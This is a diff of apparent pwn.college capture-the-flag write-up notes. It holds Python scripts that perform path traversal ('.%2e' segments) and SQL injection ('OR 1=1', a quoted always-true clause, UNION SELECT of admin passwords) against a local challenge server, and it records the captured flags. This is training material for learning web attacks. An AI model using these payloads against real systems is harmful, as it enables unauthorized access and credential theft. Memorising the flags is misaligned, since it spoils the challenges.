@@ -14,18 +14,12 @@ Path Traversal 2:
 Code used : 
 1. 
 import requests
-
-# Construct the path you want to access
 path = 'fortunes/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/flag'
 
-# URL-encode the path if necessary
-# However, in this case, it's better to leave it as is because Flask will decode it
 url = f"http://challenge.localhost/{path}"
-
-# Send the GET request (POST is not necessary since no data is being sent)
 response = requests.get(url)
-
 print(response.text)
+
 Explanation : We see that when we use the previous command we go to the fortunes folder, so we go into the fortunes folder and then move up the directory
 Flag: `pwn.college{UHe6gQw_rEP4UVqFJcubBFtoSju.dJjN1YDL1kTM2czW}`
 
@@ -111,9 +105,7 @@ data = {
     'username': 'admin',
     'pin': '0 OR 1=1'
 }
-
 response = requests.post(url, data=data)
-
 print(response.text)
 
 
@@ -131,11 +123,8 @@ data = {
     'username': 'admin',
     'password': "0' OR '1'='1"
 }
-
 response = requests.post(url, data=data)
-
 print(response.text)
-
 
 Explanation : Just modify the password parameter carefully using single quotes(')
 Flag: `pwn.college{EfMwHmCv6l_vquYP-sxkvRDGLsE.dBTOzMDL1kTM2czW}`
@@ -144,16 +133,11 @@ Flag: `pwn.college{EfMwHmCv6l_vquYP-sxkvRDGLsE.dBTOzMDL1kTM2czW}`
 SQLi 3:
 Code used : 
 import requests
-
 url = "http://challenge.localhost/"
-
 params = {
-
     'query': 'admin" UNION SELECT password FROM users WHERE username LIKE "admin'
 }
-
 response = requests.get(url, params=params)
-
 print(response.text)
 
 Explanation : We will join the data ub password column to the query using the UNION command.
